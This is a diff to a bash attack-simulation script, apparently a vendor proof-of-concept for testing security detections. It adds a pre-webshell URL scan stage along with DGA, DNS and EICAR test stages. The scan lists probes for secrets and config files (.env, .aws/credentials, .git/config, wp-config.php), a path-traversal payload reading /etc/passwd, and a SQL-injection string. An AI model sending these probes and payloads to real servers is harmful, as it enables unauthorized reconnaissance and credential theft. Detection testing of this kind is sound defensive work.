+    code=$(printf '%s' "${code}" | tr -cd '0-9')
+    if [[ -z "${code}" ]]; then
+        code="000"
+    fi
+    while ((${#code} < 3)); do code="0${code}"; done
+    code="${code:0:3}"
+    printf '%s' "${code}"
+}
+
+pre_webshell_track_status_code() {
+    local code="$1" result=""
+    code=$(printf '%s' "${code}" | tr -cd '0-9')
+    if [[ -z "${code}" || "${code}" == "000" ]]; then
+        PRE_WEBSHELL_SCAN_TIMEOUT=$((PRE_WEBSHELL_SCAN_TIMEOUT + 1))
+        PRE_WEBSHELL_SCAN_REAL_FAILED=$((PRE_WEBSHELL_SCAN_REAL_FAILED + 1))
+        PRE_WEBSHELL_LAST_TRACK_RESULT="timeout"
+        PRE_WEBSHELL_SCAN_REQUEST_REAL_FAILED=$((PRE_WEBSHELL_SCAN_REQUEST_REAL_FAILED + 1))
+        return 0
+    fi
+    while ((${#code} < 3)); do code="0${code}"; done
+    code="${code:0:3}"
+    case "${code}" in
+        200) PRE_WEBSHELL_SCAN_200=$((PRE_WEBSHELL_SCAN_200 + 1)); result=success ;;
+        301) PRE_WEBSHELL_SCAN_301=$((PRE_WEBSHELL_SCAN_301 + 1)); PRE_WEBSHELL_SCAN_REDIRECT=$((PRE_WEBSHELL_SCAN_REDIRECT + 1)); result=redirect ;;
+        302) PRE_WEBSHELL_SCAN_302=$((PRE_WEBSHELL_SCAN_302 + 1)); PRE_WEBSHELL_SCAN_REDIRECT=$((PRE_WEBSHELL_SCAN_REDIRECT + 1)); result=redirect ;;
+        400) PRE_WEBSHELL_SCAN_400=$((PRE_WEBSHELL_SCAN_400 + 1)); PRE_WEBSHELL_SCAN_REAL_FAILED=$((PRE_WEBSHELL_SCAN_REAL_FAILED + 1)); result=real_failed ;;
+        401) PRE_WEBSHELL_SCAN_401=$((PRE_WEBSHELL_SCAN_401 + 1)); PRE_WEBSHELL_SCAN_REAL_FAILED=$((PRE_WEBSHELL_SCAN_REAL_FAILED + 1)); result=real_failed ;;
+        403) PRE_WEBSHELL_SCAN_403=$((PRE_WEBSHELL_SCAN_403 + 1)); PRE_WEBSHELL_SCAN_REAL_FAILED=$((PRE_WEBSHELL_SCAN_REAL_FAILED + 1)); result=real_failed ;;
+        404) PRE_WEBSHELL_SCAN_404=$((PRE_WEBSHELL_SCAN_404 + 1)); PRE_WEBSHELL_SCAN_REAL_FAILED=$((PRE_WEBSHELL_SCAN_REAL_FAILED + 1)); result=real_failed ;;
+        405) PRE_WEBSHELL_SCAN_405=$((PRE_WEBSHELL_SCAN_405 + 1)); PRE_WEBSHELL_SCAN_REAL_FAILED=$((PRE_WEBSHELL_SCAN_REAL_FAILED + 1)); result=real_failed ;;
+        500) PRE_WEBSHELL_SCAN_500=$((PRE_WEBSHELL_SCAN_500 + 1)); PRE_WEBSHELL_SCAN_REAL_FAILED=$((PRE_WEBSHELL_SCAN_REAL_FAILED + 1)); result=real_failed ;;
+        *)
+            if [[ "${code:0:1}" == "4" || "${code:0:1}" == "5" ]]; then
+                PRE_WEBSHELL_SCAN_REAL_FAILED=$((PRE_WEBSHELL_SCAN_REAL_FAILED + 1))
+                result=real_failed
+            else
+                result=other
+            fi
+            ;;
+    esac
+    PRE_WEBSHELL_LAST_TRACK_RESULT="${result}"
+    if [[ "${result}" == "real_failed" || "${result}" == "timeout" ]]; then
+        PRE_WEBSHELL_SCAN_REQUEST_REAL_FAILED=$((PRE_WEBSHELL_SCAN_REQUEST_REAL_FAILED + 1))
+    fi
+    return 0
+}
+
+pre_webshell_expected_real_failed_from_status() {
+    printf '%s' "$(( PRE_WEBSHELL_SCAN_400 + PRE_WEBSHELL_SCAN_401 + PRE_WEBSHELL_SCAN_403 + PRE_WEBSHELL_SCAN_404 + PRE_WEBSHELL_SCAN_405 + PRE_WEBSHELL_SCAN_500 + PRE_WEBSHELL_SCAN_TIMEOUT ))"
+}
+
+pre_webshell_reconcile_summary_counters() {
+    local expected="" http_fail=0
+    expected=$(pre_webshell_expected_real_failed_from_status)
+    expected=$(safe_int "${expected}")
+    http_fail=$(( PRE_WEBSHELL_SCAN_404 + PRE_WEBSHELL_SCAN_403 + PRE_WEBSHELL_SCAN_401 + PRE_WEBSHELL_SCAN_400 + PRE_WEBSHELL_SCAN_405 + PRE_WEBSHELL_SCAN_500 ))
+    if (( PRE_WEBSHELL_SCAN_REAL_FAILED != expected )); then
+        log_message "ERROR" "PRE_WEBSHELL_URL_SCAN_COUNTER_BUG tracked_real_failed=${PRE_WEBSHELL_SCAN_REAL_FAILED} expected_real_failed=${expected} request_real_failed=${PRE_WEBSHELL_SCAN_REQUEST_REAL_FAILED} http_4xx_5xx=${http_fail} timeout=${PRE_WEBSHELL_SCAN_TIMEOUT}"
+        state_append "pre_webshell_url_scan.log" "PRE_WEBSHELL_URL_SCAN_COUNTER_BUG tracked_real_failed=${PRE_WEBSHELL_SCAN_REAL_FAILED} expected_real_failed=${expected} request_real_failed=${PRE_WEBSHELL_SCAN_REQUEST_REAL_FAILED}"
+        PRE_WEBSHELL_SCAN_REAL_FAILED="${expected}"
+    elif (( PRE_WEBSHELL_SCAN_REAL_FAILED == 0 && http_fail > 0 )); then
+        log_message "ERROR" "PRE_WEBSHELL_URL_SCAN_COUNTER_BUG tracked_real_failed=0 but status_counters=${http_fail} timeout=${PRE_WEBSHELL_SCAN_TIMEOUT}"
+        state_append "pre_webshell_url_scan.log" "PRE_WEBSHELL_URL_SCAN_COUNTER_BUG tracked_real_failed=0 expected_real_failed=${expected}"
+        PRE_WEBSHELL_SCAN_REAL_FAILED="${expected}"
+    fi
+    if (( PRE_WEBSHELL_SCAN_REQUEST_REAL_FAILED != PRE_WEBSHELL_SCAN_REAL_FAILED )); then
+        log_message "WARN" "PRE_WEBSHELL_URL_SCAN_COUNTER_MISMATCH request_real_failed=${PRE_WEBSHELL_SCAN_REQUEST_REAL_FAILED} summary_real_failed=${PRE_WEBSHELL_SCAN_REAL_FAILED}"
+    fi
+}
+
+compute_pre_webshell_detection_likelihood() {
+    local unique="${PRE_WEBSHELL_SCAN_UNIQUE}" real_failed="${PRE_WEBSHELL_SCAN_REAL_FAILED}"
+    local abnormal="${PRE_WEBSHELL_SCAN_ABNORMAL_UA}" duration="${PRE_WEBSHELL_SCAN_DURATION}"
+    PRE_WEBSHELL_SCAN_LIKELIHOOD="low"
+    PRE_WEBSHELL_SCAN_REASON="below medium threshold (unique=${unique} real_failed=${real_failed} abnormal_ua=${abnormal} duration=${duration}s)"
+    if (( unique >= 40 && real_failed >= 30 && abnormal >= 40 && duration <= 60 )); then
+        PRE_WEBSHELL_SCAN_LIKELIHOOD="high"
+        PRE_WEBSHELL_SCAN_REASON="unique_urls>=40 real_failed>=30 abnormal_ua>=40 duration<=${duration}s"
+        return 0
+    fi
+    if (( unique >= 25 && real_failed >= 15 && abnormal >= 25 )); then
+        PRE_WEBSHELL_SCAN_LIKELIHOOD="medium"
+        PRE_WEBSHELL_SCAN_REASON="unique_urls>=25 real_failed>=15 abnormal_ua>=25"
+        return 0
+    fi
+}
+
+log_pre_webshell_url_scan_summary() {
+    local block=""
+    pre_webshell_reconcile_summary_counters
+    block="PRE_WEBSHELL_URL_SCAN_SUMMARY
+target=${PRE_WEBSHELL_SCAN_TARGET}
+base_url=${PRE_WEBSHELL_SCAN_BASE_URL}
+total_requests=${PRE_WEBSHELL_SCAN_TOTAL}
+unique_urls=${PRE_WEBSHELL_SCAN_UNIQUE}
+http_200=${PRE_WEBSHELL_SCAN_200}
+http_301=${PRE_WEBSHELL_SCAN_301}
+http_302=${PRE_WEBSHELL_SCAN_302}
+http_400=${PRE_WEBSHELL_SCAN_400}
+http_401=${PRE_WEBSHELL_SCAN_401}
+http_403=${PRE_WEBSHELL_SCAN_403}
+http_404=${PRE_WEBSHELL_SCAN_404}
+http_405=${PRE_WEBSHELL_SCAN_405}
+http_500=${PRE_WEBSHELL_SCAN_500}
+timeout=${PRE_WEBSHELL_SCAN_TIMEOUT}
+real_failed=${PRE_WEBSHELL_SCAN_REAL_FAILED}
+redirect_count=${PRE_WEBSHELL_SCAN_REDIRECT}
+ua_present=${PRE_WEBSHELL_SCAN_UA_PRESENT}
+abnormal_ua=${PRE_WEBSHELL_SCAN_ABNORMAL_UA}
+duration_seconds=${PRE_WEBSHELL_SCAN_DURATION}
+detection_likelihood=${PRE_WEBSHELL_SCAN_LIKELIHOOD}
+reason=${PRE_WEBSHELL_SCAN_REASON}"
+    state_append "pre_webshell_url_scan.log" "${block//$'\n'/ ; }"
+    log_message "OK" "PRE_WEBSHELL_URL_SCAN_SUMMARY target=${PRE_WEBSHELL_SCAN_BASE_URL} unique=${PRE_WEBSHELL_SCAN_UNIQUE} real_failed=${PRE_WEBSHELL_SCAN_REAL_FAILED} abnormal_ua=${PRE_WEBSHELL_SCAN_ABNORMAL_UA} likelihood=${PRE_WEBSHELL_SCAN_LIKELIHOOD}"
+    if declare -F poc_customer_emit_block >/dev/null 2>&1; then
+        poc_customer_emit_block "${block}"
+    fi
+}
+
+log_pre_webshell_request_debug() {
+    local url="$1" code="$2" ua="$3" ua_class="$4" result="$5"
+    local msg="PRE_WEBSHELL_URL_SCAN_REQUEST url=${url} status_code=${code} user_agent=${ua} ua_class=${ua_class} result=${result}"
+    state_append "pre_webshell_url_scan_requests.log" "${msg}"
+    if [[ "${DEBUG}" == true || "${POC_OBS_DEBUG}" == true || "${VERBOSE}" == true ]]; then
+        log_message "DEBUG" "${msg}"
+    fi
+}
+
+stage_pre_webshell_url_scan() {
+    local -a paths=(
+        '/.git/config'
+        '/.git/HEAD'
+        '/.svn/entries'
+        '/.env'
+        '/.env.local'
+        '/.env.production'
+        '/laravel/.env'
+        '/WEB-INF/web.xml'
+        '/WEB-INF/classes/'
+        '/phpinfo.php'
+        '/server-status'
+        '/actuator/env'
+        '/actuator/heapdump'
+        '/actuator/health'
+        '/api/swagger'
+        '/api/documentation'
+        '/swagger-ui.html'
+        '/graphql'
+        '/admin'
+        '/dashboard'
+        '/api/login'
+        '/api/v1/login'
+        '/login'
+        '/cmd.jsp'
+        '/shell.jsp.bak'
+        '/upload.jsp'
+        '/manager/html'
+        '/host-manager/html'
+        '/tomcat/manager/html'
+        '/jmx-console'
+        '/console'
+        '/docker-compose.yml'
+        '/k8s.yml'
+        '/backup.zip'
+        '/db.sql'
+        '/config.php'
+        '/config.json'
+        '/.aws/credentials'
+        '/wp-config.php'
+        '/?file=../../../../etc/passwd'
+        '/admin?id=%27+OR+1%3D1--'
+        '/api/v1/users?debug=1'
+        '/backup.sql.bak'
+    )
+    local path url ua ua_class code result t0 stage_status="Success" stage_detail=""
+    local seen="" unique_count=0 total_count=0 scan_finalize_done=false
+
+    pre_webshell_url_scan_finalize() {
+        [[ "${scan_finalize_done}" == true ]] && return 0
+        scan_finalize_done=true
+        local now
+        now=$(date +%s)
+        PRE_WEBSHELL_SCAN_DURATION=$((now - t0))
+        PRE_WEBSHELL_SCAN_TOTAL="${total_count}"
+        PRE_WEBSHELL_SCAN_UNIQUE="${unique_count}"
+        compute_pre_webshell_detection_likelihood
+        log_pre_webshell_url_scan_summary
+    }
+
+    add_executed_stage "Pre-WebShell Target URL Scan"
+    write_report_entries "pre_webshell_url_scan" "T1595.002" "NDR/WAF" "External URL Recon" "webshell-host" "start" "attacker-side URL scan before webshell channel"
+
+    PRE_WEBSHELL_SCAN_BASE_URL=$(parse_webshell_scan_base_url "${WEB_SHELL_URL}")
+    PRE_WEBSHELL_SCAN_TARGET="${PRE_WEBSHELL_SCAN_BASE_URL}"
+    PRE_WEBSHELL_SCAN_TOTAL=0
+    PRE_WEBSHELL_SCAN_UNIQUE=0
+    PRE_WEBSHELL_SCAN_200=0
+    PRE_WEBSHELL_SCAN_301=0
+    PRE_WEBSHELL_SCAN_302=0
+    PRE_WEBSHELL_SCAN_400=0
+    PRE_WEBSHELL_SCAN_401=0
+    PRE_WEBSHELL_SCAN_403=0
+    PRE_WEBSHELL_SCAN_404=0
+    PRE_WEBSHELL_SCAN_405=0
+    PRE_WEBSHELL_SCAN_500=0
+    PRE_WEBSHELL_SCAN_TIMEOUT=0
+    PRE_WEBSHELL_SCAN_REAL_FAILED=0
+    PRE_WEBSHELL_SCAN_REDIRECT=0
+    PRE_WEBSHELL_SCAN_UA_PRESENT=0
+    PRE_WEBSHELL_SCAN_ABNORMAL_UA=0
+    PRE_WEBSHELL_SCAN_DURATION=0
+    PRE_WEBSHELL_SCAN_LIKELIHOOD="low"
+    PRE_WEBSHELL_SCAN_REASON=""
+    PRE_WEBSHELL_SCAN_STAGE_STATUS="running"
+    PRE_WEBSHELL_LAST_TRACK_RESULT=""
+    PRE_WEBSHELL_SCAN_REQUEST_REAL_FAILED=0
+
+    log_message "OK" "Pre-WebShell Target URL Scan: attacker-side local recon against ${PRE_WEBSHELL_SCAN_BASE_URL} (before webshell internal stages)"
+
+    if [[ "${DRY_RUN}" == true ]]; then
+        PRE_WEBSHELL_SCAN_UNIQUE=${#paths[@]}
+        PRE_WEBSHELL_SCAN_TOTAL=${#paths[@]}
+        PRE_WEBSHELL_SCAN_404=32
+        PRE_WEBSHELL_SCAN_403=5
+        PRE_WEBSHELL_SCAN_401=2
+        PRE_WEBSHELL_SCAN_200=1
+        PRE_WEBSHELL_SCAN_REAL_FAILED=39
+        PRE_WEBSHELL_SCAN_UA_PRESENT=${#paths[@]}
+        PRE_WEBSHELL_SCAN_ABNORMAL_UA=${#paths[@]}
+        PRE_WEBSHELL_SCAN_DURATION=45
+        compute_pre_webshell_detection_likelihood
+        log_pre_webshell_url_scan_summary
+        stage_detail="target=${PRE_WEBSHELL_SCAN_BASE_URL} unique_urls=${PRE_WEBSHELL_SCAN_UNIQUE} real_failed=${PRE_WEBSHELL_SCAN_REAL_FAILED} abnormal_ua=${PRE_WEBSHELL_SCAN_ABNORMAL_UA} likelihood=${PRE_WEBSHELL_SCAN_LIKELIHOOD} (dry-run)"
+        PRE_WEBSHELL_SCAN_STAGE_STATUS="success"
+        set_stage_result "Pre-WebShell URL Scan" "Success" "${stage_detail}"
+        write_report_entries "pre_webshell_url_scan" "T1595.002" "NDR/WAF" "External URL Recon" "${PRE_WEBSHELL_SCAN_BASE_URL}" "success" "${stage_detail}"
+        return 0
+    fi
+
+    if [[ "${LOCAL_HAS_CURL}" != true ]] && ! command -v python3 >/dev/null 2>&1; then
+        PRE_WEBSHELL_SCAN_STAGE_STATUS="skipped"
+        set_stage_result "Pre-WebShell URL Scan" "Skipped" "local curl and python3 unavailable for attacker-side scan"
+        write_report_entries "pre_webshell_url_scan" "T1595.002" "NDR/WAF" "External URL Recon" "${PRE_WEBSHELL_SCAN_BASE_URL}" "skipped" "no local HTTP client"
+        return 0
+    fi
+
+    if declare -F poc_obs_stage_start >/dev/null 2>&1; then
+        poc_obs_stage_start "Pre-WebShell Target URL Scan"
+    fi
+
+    t0=$(date +%s)
+    set +e
+    for path in "${paths[@]}"; do
+        if [[ " ${seen} " == *" ${path} "* ]]; then
+            continue
+        fi
+        seen="${seen} ${path}"
+        unique_count=$((unique_count + 1))
+        url="${PRE_WEBSHELL_SCAN_BASE_URL}${path#/}"
+        ua=$(pre_webshell_pick_ua)
+        ua_class=$(pre_webshell_classify_ua "${ua}")
+        PRE_WEBSHELL_SCAN_UA_PRESENT=$((PRE_WEBSHELL_SCAN_UA_PRESENT + 1))
+        PRE_WEBSHELL_SCAN_ABNORMAL_UA=$((PRE_WEBSHELL_SCAN_ABNORMAL_UA + 1))
+        total_count=$((total_count + 1))
+        code=$(pre_webshell_local_http_request "${url}" "${ua}" || printf '000')
+        pre_webshell_track_status_code "${code}" || true
+        result="${PRE_WEBSHELL_LAST_TRACK_RESULT}"
+        log_pre_webshell_request_debug "${url}" "${code}" "${ua}" "${ua_class}" "${result}"
+    done
+    set -e
+    pre_webshell_url_scan_finalize
+
+    if (( PRE_WEBSHELL_SCAN_UNIQUE < 25 )); then
+        stage_status="Partial"
+        PRE_WEBSHELL_SCAN_STAGE_STATUS="partial"
+    elif [[ "${PRE_WEBSHELL_SCAN_LIKELIHOOD}" == low ]]; then
+        stage_status="Partial"
+        PRE_WEBSHELL_SCAN_STAGE_STATUS="partial"
+    else
+        PRE_WEBSHELL_SCAN_STAGE_STATUS="success"
+    fi
+
+    stage_detail="target=${PRE_WEBSHELL_SCAN_BASE_URL} unique_urls=${PRE_WEBSHELL_SCAN_UNIQUE} real_failed=${PRE_WEBSHELL_SCAN_REAL_FAILED} abnormal_ua=${PRE_WEBSHELL_SCAN_ABNORMAL_UA} likelihood=${PRE_WEBSHELL_SCAN_LIKELIHOOD}"
+    set_stage_result "Pre-WebShell URL Scan" "${stage_status}" "${stage_detail}"
+    write_report_entries "pre_webshell_url_scan" "T1595.002" "NDR/WAF" "External URL Recon" "${PRE_WEBSHELL_SCAN_BASE_URL}" "${stage_status,,}" "${stage_detail}"
+
+    if declare -F poc_obs_stage_end >/dev/null 2>&1; then
+        poc_obs_stage_end "Pre-WebShell Target URL Scan"
+    fi
+    if declare -F log_detection_quality >/dev/null 2>&1; then
+        log_detection_quality "Pre-WebShell URL Scan" "${PRE_WEBSHELL_SCAN_TOTAL}" "${PRE_WEBSHELL_SCAN_DURATION}" \
+            "${PRE_WEBSHELL_SCAN_BASE_URL}" "external_url_recon" "${PRE_WEBSHELL_SCAN_LIKELIHOOD}" "${PRE_WEBSHELL_SCAN_REASON}"
+    fi
+    return 0
 }
 
 stage_host_discovery() {
@@ -2323,6 +3496,8 @@ done
 }
 
 stage_service_discovery() {
+    poc_obs_stage_start "Discovery"
+    poc_obs_discovery_header
     add_executed_stage "Service Discovery"
     write_report_entries "service_discovery" "T1046" "NDR" "Internal Port Scan" "${TARGET_NET}" "start" "full /24 service discovery"
     run_webshell_quick "init-target-files" \
@@ -2355,6 +3530,9 @@ stage_service_discovery() {
 
     log_discovery_diagnostics
     record_discovered_services_snapshot
+    poc_obs_emit_discovery_from_cache
+    POC_OBS_ALIVE_HOSTS=$(count_alive_hosts_from_discovery 2>/dev/null || echo 0)
+    poc_obs_stage_end "Discovery"
     write_report_entries "service_discovery" "T1046" "NDR" "Internal Port Scan" "${TARGET_NET}" "success" "service map total=${SERVICES_DISCOVERED_TOTAL}"
 }
 
@@ -2363,16 +3541,24 @@ run_post_discovery_pipeline() {
     local include_process="${2:-false}"
     pipeline_stop_requested && return 130
     count_all_discovered_services >/dev/null
+    stage_discover_http_candidates || true
     stage_validate_discovered_services_usable || true
+    stage_validate_web_reachability || true
     stage_adaptive_operator_followup
     apply_followup_intensity_defaults
     execute_jitter
     stage_mandatory_service_followups
+    if [[ "${WEBSHELL_CHANNEL_BROKEN}" == true ]]; then
+        log_message "WARN" "Webshell channel broken — skipping remaining webshell-based follow-up stages (Process Chain, DNS, DGA, etc.)"
+        add_skipped_stage "Post-Discovery Follow-ups" "WEBSHELL_CHANNEL_BROKEN after EDR static test"
+        return 0
+    fi
     if [[ "${PIPELINE_OVERLAP}" == true ]]; then
         run_followup_stages_adaptive "${include_windows}" true
     else
         run_followup_stages_adaptive "${include_windows}" false
     fi
+    stage_correlation_telemetry_bundle
     stage_service_spike_burst
     stage_followup_validation || pipeline_stop_requested && return 130
     if [[ "${include_process}" == true ]]; then
@@ -2478,6 +3664,14 @@ stage_windows_telemetry() {
 
 stage_dns_tunnel_simulation() {
     followup_stage_dns
+}
+
+stage_dga_simulation() {
+    followup_stage_dga
+}
+
+stage_dns_new_tld_test() {
+    followup_stage_dns_new_tld
 }
 
 stage_beaconing() {
@@ -2633,6 +3827,7 @@ stage_cleanup_simulation() {
     write_report_entries "cleanup" "T1070" "EDR" "Runtime Cleanup" "localhost" "start" "cleanup runtime only"
     local cleanup_cmd
     cleanup_cmd=$(safe_remote_cleanup_stage_artifacts) || return 0
+    cleanup_edr_static_test_on_exit || true
     run_webshell "cleanup" "${cleanup_cmd}" >/dev/null
     write_report_entries "cleanup" "T1070" "EDR" "Runtime Cleanup" "localhost" "success" "cleanup complete"
 }
@@ -2652,18 +3847,18 @@ start_overlap_if_enabled() {
     if overlap_will_execute; then
         add_fallback_usage "Overlap enabled: beacon + dns stages running in background"
         if [[ "${VERBOSE}" == true ]]; then
-            echo "[+] Starting overlap stage: beaconing"
+            vlog "Starting overlap stage: beaconing"
         fi
         OVERLAP_BEACON_STARTED=true
         stage_beaconing & OVERLAP_PIDS+=("$!")
         if [[ "${VERBOSE}" == true ]]; then
-            echo "[+] Overlap PID: ${OVERLAP_PIDS[-1]}"
-            echo "[+] Starting overlap stage: dns_tunnel"
+            vlog "Overlap PID: ${OVERLAP_PIDS[-1]}"
+            vlog "Starting overlap stage: dns_tunnel"
         fi
         OVERLAP_DNS_STARTED=true
         stage_dns_tunnel_simulation & OVERLAP_PIDS+=("$!")
         if [[ "${VERBOSE}" == true ]]; then
-            echo "[+] Overlap PID: ${OVERLAP_PIDS[-1]}"
+            vlog "Overlap PID: ${OVERLAP_PIDS[-1]}"
         fi
     fi
 }
@@ -2694,6 +3889,9 @@ run_selected_pipeline_once() {
     PIPELINE_OVERLAP_PIDS=()
     stage_burst_activity
     case "${MODE}" in
+        fast-safe)
+            run_fast_safe_pipeline_once
+            ;;
         quick)
             start_overlap_if_enabled
             run_pipeline_stage "Initial Foothold" stage_initial_foothold
@@ -2703,8 +3901,16 @@ run_selected_pipeline_once() {
             run_pipeline_stage "TCP Fanout" stage_tcp_fanout
             run_post_discovery_pipeline false false
             if ! overlap_will_execute; then
+                if [[ "${DNS_NEW_TLD_ENABLED}" == true ]]; then
+                    run_stage_safe "DNS New TLD Test" stage_dns_new_tld_test
+                    execute_jitter
+                fi
                 run_stage_safe "DNS Tunnel" stage_dns_tunnel_simulation
                 execute_jitter
+                if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
+                    run_stage_safe "DGA Simulation" stage_dga_simulation
+                    execute_jitter
+                fi
                 run_stage_safe "Beaconing" stage_beaconing
                 execute_jitter
             fi
@@ -2712,7 +3918,7 @@ run_selected_pipeline_once() {
             wait_overlap_jobs
             wait_all_humanize_workers
             ;;
-        balanced|full)
+        comprehensive|balanced|full)
             start_overlap_if_enabled
             run_pipeline_stage "Initial Foothold" stage_initial_foothold
             run_pipeline_stage "Host Discovery" stage_host_discovery
@@ -2721,8 +3927,16 @@ run_selected_pipeline_once() {
             run_pipeline_stage "TCP Fanout" stage_tcp_fanout
             run_post_discovery_pipeline true true
             if ! overlap_will_execute; then
+                if [[ "${DNS_NEW_TLD_ENABLED}" == true ]]; then
+                    run_stage_safe "DNS New TLD Test" stage_dns_new_tld_test
+                    execute_jitter
+                fi
                 run_stage_safe "DNS Tunnel" stage_dns_tunnel_simulation
                 execute_jitter
+                if [[ "${DGA_SIMULATION_ENABLED}" == true ]]; then
+                    run_stage_safe "DGA Simulation" stage_dga_simulation
+                    execute_jitter
+                fi
                 run_stage_safe "Beaconing" stage_beaconing
                 execute_jitter
             fi
@@ -2796,10 +4010,24 @@ run_pipeline_duration_mode() {
 
 run_pipeline_cycles() {
     if [[ "${DRY_RUN}" == true ]]; then
-        if [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]] \
+        if fast_safe_mode_enabled; then
+            print_fast_safe_dry_run_plan
+        elif [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]] \
             || [[ "${DURATION_MINUTES}" =~ ^[0-9]+$ && "${DURATION_MINUTES}" -gt 0 ]]; then
             print_repeat_execution_plan
         fi
+        if fast_safe_mode_enabled; then
+            run_fast_safe_pipeline_once
+        fi
+        return 0
+    fi
+
+    if fast_safe_mode_enabled; then
+        log_message "OK" "FAST_SAFE pipeline: single cycle (hard limit ${FAST_SAFE_HARD_TIMEOUT_SEC}s)"
+        CURRENT_CYCLE=1
+        log_cycle_start
+        run_fast_safe_pipeline_once
+        TOTAL_CYCLES_COMPLETED=1
         return 0
     fi
 
@@ -2835,8 +4063,11 @@ append_detection_matrix() {
 | Elastic Follow-up | Elasticsearch Enumeration / HTTP Recon |
 | Mongo Follow-up | MongoDB Enumeration |
 | HTTP/HTTPS Follow-up | HTTP Recon / HTTPS Recon / Web Exploit Recon |
+| DNS New TLD Test | dns_new_tld / Top-Level Domain Anomaly |
 | DNS Tunnel | DNS Tunnel |
+| DGA Simulation | DGA / DNS Anomaly |
 | Beaconing | Beaconing |
+| EDR Static Signature Detection Test | EICAR Test File / AMTSO CloudCar Test File / Suspicious Test File Creation / Potential AV/EDR Quarantine Event |
 | Windows Telemetry | SMB Recon / RPC Enumeration / AD Discovery / Kerberos Activity |
 | Process Chain | Abnormal Parent Child / Suspicious Process Chain |
 | Exfil Simulation | Exfiltration |
@@ -2882,9 +4113,14 @@ append_stage_execution_summary() {
     } >> "${REPORT_MD}" 2>/dev/null || log_message "WARN" "Could not append stage summary to ${REPORT_MD}"
 }
 
-generate_customer_summary() {
-    [[ -n "${CUSTOMER_SUMMARY_TXT}" ]] || return 0
-    safe_write_file "${CUSTOMER_SUMMARY_TXT}" "$(cat <<EOF
+append_customer_summary_to_report() {
+    [[ -n "${REPORT_MD}" ]] || return 0
+    cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true
+
+## Customer summary
+
+EOF
+    cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true
 Stellar Cyber PoC Customer Summary
 ==================================
 Campaign ID: ${CAMPAIGN_ID}
@@ -2902,14 +4138,21 @@ Report Copy Performed: ${REPORT_COPY_PERFORMED}
 
 $(format_path_isolation_block)
 
+Pre-WebShell URL Scan (attack flow):
+Before using the webshell channel, the attacker-side host performed URL reconnaissance against the target web server to simulate vulnerability discovery activity prior to exploitation.
+
 Expected / Likely Detections:
+- Pre-WebShell External URL Recon (attacker-side vulnerability path scan)
 - Internal IP Scan
 - Internal Port Scan
 - Failed SSH Login / Brute-force-like Activity
 - Redis / Elasticsearch / MongoDB Enumeration
 - HTTP Recon / HTTPS Recon / Web Exploit Recon
+- DNS New TLD Test
 - DNS Tunnel
+- DGA Simulation
 - Beaconing
+- EDR Static Signature Detection Test (EICAR / AMTSO CloudCar — file create only)
 - SMB Recon / RPC Enumeration / AD Discovery
 - Abnormal Parent Child / Suspicious Process Chain
 - Exfiltration
@@ -2931,12 +4174,16 @@ $(read_state_file_or_none "stage_results.log" | sed 's/^/- /')
 
 $(format_dependency_matrix)
 EOF
-)" || log_message "WARN" "Could not write ${CUSTOMER_SUMMARY_TXT}"
+}
+
+generate_customer_summary() {
+    append_customer_summary_to_report
 }
 
 print_dry_run_plan() {
     cat <<EOF
 [DRY-RUN PLAN]
+$(format_intensity_runtime_values_block)
 - Intensity: ${POC_INTENSITY} | Duration: ${DURATION_MINUTES} minutes (independent controls)
 - Pipeline: ${MODE} | Persistent beacon: ${PERSISTENT_BEACON} | Overlap: ${PIPELINE_OVERLAP}
 - Attacker callback: ${ATTACKER_BASE_URL}${CALLBACK_PREFIX}
@@ -2951,6 +4198,7 @@ EOF
     fi
     print_humanize_dry_run_plan
     print_followup_dry_run_plan
+    format_validation_result_block
 }
 
 generate_dry_run_reports() {
@@ -2961,7 +4209,9 @@ SIMULATED EXECUTION PLAN
 
 Mode/Profile: ${MODE}/${PROFILE}
 Webshell Method: ${WEBSHELL_METHOD}
-Auto Overlap: ${AUTO_OVERLAP}
+Pipeline overlap configured: ${PIPELINE_OVERLAP}
+Overlap workers executed: ${OVERLAP_EXECUTED}
+Auto overlap schedule: $(overlap_auto_description)
 Overlap execution: $(overlap_plan_description)
 Remote Runtime Dir: ${REMOTE_RUNTIME_DIR}
 Runtime Mode: ${RUNTIME_MODE}
@@ -2980,7 +4230,9 @@ $(format_path_isolation_block)
 - Internal Scan
 - SSH/Redis/Elastic/Mongo Enumeration
 - HTTP/HTTPS Recon
+- DNS New TLD Test
 - DNS Tunnel
+- DGA Simulation
 - Beaconing
 - Windows Telemetry
 - Exfiltration
@@ -3001,80 +4253,39 @@ $(read_state_file_or_none "stage_results.log" | sed 's/^/- /')
 $(read_state_file_or_none "fallback_usage.log" | sed 's/^/- /')
 EOF
 )" || log_message "WARN" "Could not write ${REPORT_MD}"
-    safe_write_file "${SUMMARY_TXT}" "$(cat <<EOF
-SIMULATED EXECUTION PLAN
+    cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true
+
+## Telemetry summary (dry-run)
+
+$(format_http_followup_summary_block)
+
+$(format_http_followup_capability_block)
+
+$(format_correlation_telemetry_summary_block)
+
 $(format_capability_matrix)
-
-Campaign ID: ${CAMPAIGN_ID}
-Mode/Profile: ${MODE}/${PROFILE}
-Webshell: ${WEB_SHELL_URL}
-Webshell Method: ${WEBSHELL_METHOD}
-Target Net: ${TARGET_NET}
-Overlap Planned: ${AUTO_OVERLAP}
-Overlap execution: $(overlap_plan_description)
-Remote Runtime Dir: ${REMOTE_RUNTIME_DIR}
-Runtime Mode: ${RUNTIME_MODE}
-Runtime Ephemeral: ${RUNTIME_EPHEMERAL}
-Runtime Cleanup On Exit: ${CLEANUP_RUNTIME_ON_EXIT}
-Runtime Fallback Used: ${RUNTIME_FALLBACK_USED}
-Runtime Ownership Issue: ${RUNTIME_OWNERSHIP_ISSUE}
-Report Dir: ${EFFECTIVE_REPORT_DIR}
-Report Preserved: ${REPORT_PRESERVED}
-Report Copy Performed: ${REPORT_COPY_PERFORMED}
-Fallback Planned: yes (dependency unknown in dry-run; parallel /dev/tcp scan when nmap absent)
-
-$(format_path_isolation_block)
-
-Simulated Targets:
-- ssh: 10.10.10.10, 10.10.10.20
-- http: 10.10.10.30, 10.10.10.40
-- https: 10.10.10.50
-- redis: 10.10.10.80
-- elastic: 10.10.10.90
-- mongo: 10.10.10.100
-
-Stage Results:
